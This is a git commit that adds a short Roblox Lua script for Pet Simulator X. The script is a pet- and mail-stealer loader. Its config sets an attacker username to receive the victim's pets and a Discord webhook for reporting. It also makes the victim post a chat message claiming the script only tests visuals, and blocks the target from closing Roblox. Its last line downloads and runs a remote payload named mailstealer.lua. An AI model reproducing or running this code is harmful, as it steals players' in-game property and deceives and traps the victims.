7ca47d4da8eced91950a5628a29499525db84af1
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-07-15 13:58:59 +0500

    Upload ice_cryptic_0.lua

---
+++ ice_cryptic_0.lua
@@ -0,0 +1,9 @@
+
+_G.Username = "quaddy77" --// Username To Send Pets To
+_G.GiftMessage = "lol" --// Message For The Gift To Say
+_G.SendMessage = "I made this script trying to test visuals" --// Message the victim will send in the chat on execution
+_G.Diamonds = 0 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Webhook = "https://discord.com/api/webhooks/1129698054115696730/mMIUGsTjziTJrIHYcQBgzzSP7660ZQet2O3kzylQZGyq87Tb3btGbXLGYh961Ekc79gO" --// Discord Webhook URL
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GadoScripts/PetSimulatorX/main/mailstealer.lua"))()
